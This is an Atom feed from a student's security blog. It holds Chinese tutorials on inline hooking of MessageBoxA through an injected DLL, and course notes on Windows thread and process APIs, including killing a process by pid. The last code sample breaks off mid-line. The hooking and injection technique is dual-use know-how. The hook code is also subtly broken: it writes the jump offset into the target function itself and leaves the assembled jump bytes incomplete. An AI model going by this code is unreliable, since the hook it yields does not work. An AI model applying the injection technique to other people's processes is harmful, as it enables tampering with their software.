<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-09-29T14:46:30.514Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hook专题1-inline hook</title>
    <link href="http://example.com/2022/09/29/Hook1-inline%20hook/"/>
    <id>http://example.com/2022/09/29/Hook1-inline%20hook/</id>
    <published>2022-09-29T10:00:00.000Z</published>
    <updated>2022-09-29T14:46:30.514Z</updated>
    
    <content type="html"><![CDATA[<p>学一学 hook 专题，今天是 inline hook。</p><span id="more"></span><h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><h3 id="hook概念"><a href="#hook概念" class="headerlink" title="hook概念"></a>hook概念</h3><p>hook 就是钩子，是一种劫持技术，把原本执行的函数替换，替换为我自己的一个函数。当然在学 pwn 的时候，也有接触过 hook，就是 malloc_hook 和 free_hook。这些 hook 本意是为了开发者方便调试自己编写的 malloc 或者 free 函数去使用的，比如我自己写了一个 free 函数，我想测试一下性能，那我直接 <strong>__free_hook=myfree</strong> 就可以测试了，但是没想到就一直被打，直到  glibc 2.34 版本，这些 hook 被彻底删除。</p><h3 id="inline-hook的用法"><a href="#inline-hook的用法" class="headerlink" title="inline hook的用法"></a>inline hook的用法</h3><p>inline hook（内联钩子），是指在函数的代码当中的一个地方（一般是代码开头），写上跳转指令，跳转到我们执行的函数，跳转完成之后，为了保持函数正常运行我们可能会释放钩子（unhook），把程序放回原来的位置，或者是直接执行完自己的代码就结束。</p><h3 id="无条件跳转指令编码"><a href="#无条件跳转指令编码" class="headerlink" title="无条件跳转指令编码"></a>无条件跳转指令编码</h3><p>一般，无条件跳转指令编码为 E9 + 32位小端序整型（根据 %rip 寄存器寻址），比如 <strong>E9 05 00 00 00</strong> 表示跳转自己后五个字节，但是需要注意的是，跳转后五个字节是指执行完这个指令之后的那个字节开始算的。</p><h3 id="hook实战"><a href="#hook实战" class="headerlink" title="hook实战"></a>hook实战</h3><p>在 VS 当中新建一个动态链接库（dll）项目。比如我们要 hook 一个 MessageBoxA 函数，我们就先获取这个函数的地址，然后找到前五个字节进行替换，跳转到我们自己写的函数当中。</p><p>全局变量申请两个字节数组，一个是原字节，一个是被 hook 之后的字节，再申请一个函数指针来指向我们要 hook 的函数。</p><p>先把原字节取出来，保存在缓冲区中，然后再计算我们函数地址到 hook 位置的一个偏移，构造好 jmp 语句。因为我们这里hook 只更改参数，需要用到下面的逻辑，所以在自己的函数中，我们调用 MessageBoxA 之前先把钩子取消掉，等待执行完毕之后，再把钩子挂会去就可以了。</p><p>dllmain：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE NewBytes[<span class="number">5</span>];</span><br><span class="line">BYTE OldBytes[<span class="number">5</span>];</span><br><span class="line">PROC HookedFunction;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">UNHOOK</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(HookedFunction, OldBytes, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">REHOOK</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(HookedFunction, NewBytes, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">HOOK</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *Module,<span class="keyword">const</span> <span class="keyword">char</span> *function,PROC HookFunction)</span> </span>&#123;</span><br><span class="line">    HookedFunction = (PROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(Module), function);</span><br><span class="line">    <span class="keyword">if</span> (HookedFunction == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T ret=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(),HookedFunction,OldBytes,<span class="number">5</span>,&amp;ret);</span><br><span class="line">    NewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(HookedFunction) = (DWORD)HookFunction-(DWORD)HookedFunction <span class="number">-5</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(HookedFunction, NewBytes, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNHOOK</span>();</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="built_in">MessageBoxA</span>(hWnd, <span class="string">&quot;xia0ji233&quot;</span>, <span class="string">&quot;hooked by xia0ji233&quot;</span>, uType);</span><br><span class="line">    <span class="built_in">REHOOK</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        HookedFunction = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(OldBytes, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">memset</span>(NewBytes, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">HOOK</span>(<span class="string">&quot;user32.dll&quot;</span>,<span class="string">&quot;MessageBoxA&quot;</span>,(PROC)MyFunction);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先写一个待 hook 的程序。</p><p>demo：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>,<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把两个都编译好之后，运行 test.exe，用注入器进行 dll 注入，再次弹窗可以发现已经成功被 hook。</p><p><img src="/2022/09/29/Hook1-inline%20hook/1.png"></p><h3 id="课外研究"><a href="#课外研究" class="headerlink" title="课外研究"></a>课外研究</h3><p>这次除了上课听的内容以外，还有很多收获。第一个就是说，我在 hook 的时候，看 WriteProcessMemory 函数参数太多了，想着写字节嘛， memcpy 也是一样的，结果出现了一个问题，就是注入并没有成功。</p><p>仔细去查的时候发现了，权限不足，那么为什么 WriteProcessMemory 函数就可以注入成功呢，它内部有一个修改内存权限的操作导致了我们写入可以成功。</p><p><img src="/2022/09/29/Hook1-inline%20hook/2.png"></p><p><img src="/2022/09/29/Hook1-inline%20hook/3.png"></p><p>按照老师的说法，因为WriteProcessMemory函数是一个调试用的API函数，权限可能比较大，能突破这个限制，关于我们队师傅对于这个 WriteProcessMemory 的解释在<a href="http://www.qfrost.com/WindowsKernel/WriteProcessMemory/">这里</a>。大概就是说，微软文档写的是一定要内存权限，但是实际上通过调试可以发现它内部会调用一个 函数去修改它的内存权限然后写入。</p><p>总之这里也是长一个心眼吧，最最关键的是，会用IDA去动调了，而且貌似操作不难，也算迈出了第一步hhh。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学一学 hook 专题，今天是 inline hook。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="reverse" scheme="http://example.com/categories/ctf/reverse/"/>
    
    <category term="hook" scheme="http://example.com/categories/ctf/reverse/hook/"/>
    
    
  </entry>
  
  <entry>
    <title>《windows系统编程》——线程基础与相关结构</title>
    <link href="http://example.com/2022/09/29/syspro2/"/>
    <id>http://example.com/2022/09/29/syspro2/</id>
    <published>2022-09-28T16:00:00.000Z</published>
    <updated>2022-09-29T09:18:23.792Z</updated>
    
    <content type="html"><![CDATA[<p>跟着 rkvir 老师学学今天的知识，今天的课程是 《Windows系统编程》——线程基础与相关结构</p><span id="more"></span><h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p>线程（Thread）就是程序执行的基本单元，一般我们写的程序只有一个线程。</p><p>当两个事件之间相互没有关联，不会影响的情况下，我们可以采取多线程的方式去节省其空间。就好比小学三年级的课程，如何加速一个泡茶的过程，最主要就是烧水的时候我们大可不必傻傻的等水烧开，我们可以利用这个时间做别的事。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#single thread</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A execute for %d times\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;B execute for %d times\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，我们的两个循环很显然上面执行完了才会执行下面的循环，如果我不要求输出顺序，我的要求只是让你输出，那么我就可以 A B 一起输出。</p><h4 id="CreateThread函数"><a href="#CreateThread函数" class="headerlink" title="CreateThread函数"></a>CreateThread函数</h4><p>在 Windows 当中，我们使用 CreateThread 函数来创建一个线程，并调用回调函数。</p><p>第一个参数是安全属性，第二个参数是堆栈大小，第三个参数是回调函数，第四个参数是线程函数的参数，第五个参数是启动标记，第六个参数会返回线程的ID。</p><p>返回值为线程句柄。</p><h4 id="WaitForSingleObject函数"><a href="#WaitForSingleObject函数" class="headerlink" title="WaitForSingleObject函数"></a>WaitForSingleObject函数</h4><p>可以用于指定程序等待线程返回，第一个参数指定线程句柄，第二个参数指定等待的最多时间，可以用 -1 表示无条件等待。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CallBackA</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread=<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)CallBackA,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread,<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I fade away\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们不加 WaitForSingleObject 去等待线程调用结束，我们会发现 I fade away 不一定会在最后输出，而加了则一定会在最后输出，这个函数可以在某些语句必须在某些语句之后执行这样的约束条件中使用。</p><h3 id="遍历线程"><a href="#遍历线程" class="headerlink" title="遍历线程"></a>遍历线程</h3><p>用之前的函数去创建线程快照，然后用对应的 entry 去遍历。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD pid = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pid:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">HANDLE hsnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD,pid);</span><br><span class="line">tagTHREADENTRY32 te32=&#123;<span class="built_in"><span class="keyword">sizeof</span></span>(te32)&#125;;</span><br><span class="line"><span class="keyword">int</span> ret=<span class="built_in">Thread32First</span>(hsnap,&amp;te32);</span><br><span class="line"><span class="keyword">while</span> (ret) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pid == te32.th32OwnerProcessID) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tid:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line">&#125;</span><br><span class="line">ret=<span class="built_in">Thread32Next</span>(hsnap, &amp;te32);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着 rkvir 老师学学今天的知识，今天的课程是 《Windows系统编程》——线程基础与相关结构&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="reverse" scheme="http://example.com/categories/ctf/reverse/"/>
    
    <category term="winprogram" scheme="http://example.com/categories/ctf/reverse/winprogram/"/>
    
    
  </entry>
  
  <entry>
    <title>《windows系统编程》——进程基础与相关结构</title>
    <link href="http://example.com/2022/09/28/syspro1/"/>
    <id>http://example.com/2022/09/28/syspro1/</id>
    <published>2022-09-27T16:00:00.000Z</published>
    <updated>2022-09-28T10:06:48.735Z</updated>
    
    <content type="html"><![CDATA[<p>跟着 rkvir 老师学学今天的知识，今天的课程是 《Windows系统编程》——进程基础与相关结构</p><span id="more"></span><h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><h3 id="系统管理进程所需的两个基本部分"><a href="#系统管理进程所需的两个基本部分" class="headerlink" title="系统管理进程所需的两个基本部分"></a>系统管理进程所需的两个基本部分</h3><ol><li>一个管理用的内核对象（进程句柄）</li><li>一个包含代码数据的地址空间。</li></ol><h3 id="创建进程的实现"><a href="#创建进程的实现" class="headerlink" title="创建进程的实现"></a>创建进程的实现</h3><h4 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h4><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><p>宏定义实现，根据字符集选择调用 CreateProcessA 或者是 CreateProcessW，实现了 ANSI 版本的创建和宽字符版的进程创建，返回一个进程句柄。</p><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><ol><li>lpApplicationName：想要执行的可执行文件的路径</li><li>lpCommand：命令行参数，可以传 NULL 表示没有参数</li><li>lpProcessAttributes：进程安全属性，传 NULL 表示默认</li><li>lpThreadAttributes：线程安全属性，传 NULL 表示默认</li><li>bInheritHandles：表示句柄是否可以被继承</li><li>dwCreationFlags：创建的新进程的标志</li><li>lpEnvironment：环境变量</li><li>lpCurrentDirectory：指定当前目录</li><li>lpStartInfo：指定启动信息</li><li>lpProcessInformation：指定进程信息</li></ol><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>启动桌面上的一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO StartupInfo;</span><br><span class="line">StartupInfo = &#123; <span class="keyword">sizeof</span>(StartupInfo) &#125;;<span class="comment">//初始化</span></span><br><span class="line">PROCESS_INFORMATION ProcessInformation;</span><br><span class="line">BOOL bRet=CreateProcess(<span class="string">L&quot;C:\\Users\\xia0ji233\\Desktop\\Processor.exe&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;StartupInfo,</span><br><span class="line">&amp;ProcessInformation</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create Success\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ProcessInformation.hProcess);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ProcessInformation.hThread);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ProcessInformation.dwProcessId);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ProcessInformation.dwThreadId);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create Error\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h5><p><img src="/2022/09/28/syspro1/1.png"></p><h3 id="进程退出"><a href="#进程退出" class="headerlink" title="进程退出"></a>进程退出</h3><h4 id="ExitProcess"><a href="#ExitProcess" class="headerlink" title="ExitProcess"></a>ExitProcess</h4><p>退出当前进程，内部参数表示退出的一个返回值，0表示正常退出。</p><h4 id="TerminateProcess"><a href="#TerminateProcess" class="headerlink" title="TerminateProcess"></a>TerminateProcess</h4><p>退出指定进程，第一个参数为进程的进程句柄，第二个参数表示退出的返回值。</p><p>如果是自己创建的进程，我们可以直接从进程信息，也就是前面 CreateProcess 给我们返回的对象中直接拿到进程句柄，如果不是我们创建的我们需要去打开它的一个进程句柄。</p><h4 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h4><p>根据 pid 返回一个进程句柄，第一个参数是打开的进程的权限，第二个参数是是否可以被继承，第三个参数是进程的 pid。</p><p>一般情况下使用 PROCESS_ALL_ACCESS 获取进程的完整权限。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;input a pid:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (hProcess != INVALID_HANDLE_VALUE) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TerminateProcess</span>(hProcess, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;kill success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="遍历进程，线程"><a href="#遍历进程，线程" class="headerlink" title="遍历进程，线程"></a>遍历进程，线程</h3><h4 id="遍历进程"><a href="#遍历进程" class="headerlink" title="遍历进程"></a>遍历进程</h4><p>我们需要用到 CreateToolhelp32Snapshot 函数，它被包含在 TlHelp32.h 头文件当中，它的作用就是拍摄一个快照，通过第一个参数选择堆，进程，线程，模块等信息，可以查看宏定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH32CS_SNAPHEAPLIST 0x00000001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH32CS_SNAPPROCESS  0x00000002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH32CS_SNAPTHREAD   0x00000004</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH32CS_SNAPMODULE   0x00000008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH32CS_SNAPMODULE32 0x00000010</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH32CS_SNAPALL      (TH32CS_SNAPHEAPLIST | TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD | TH32CS_SNAPMODULE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH32CS_INHERIT      0x80000000</span></span><br></pre></td></tr></table></figure><p>返回值是一个快照句柄。</p><p>不论是遍历什么内容，我们都用 Process32First 函数去获得信息。第一个参数是刚刚函数的返回值类型，也就是快照句柄，第二个参数用于接收结果，类型为 PROCESSENTRY32。</p><p>同样，这个结构体也要初始化。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hSnap=<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">PROCESSENTRY32 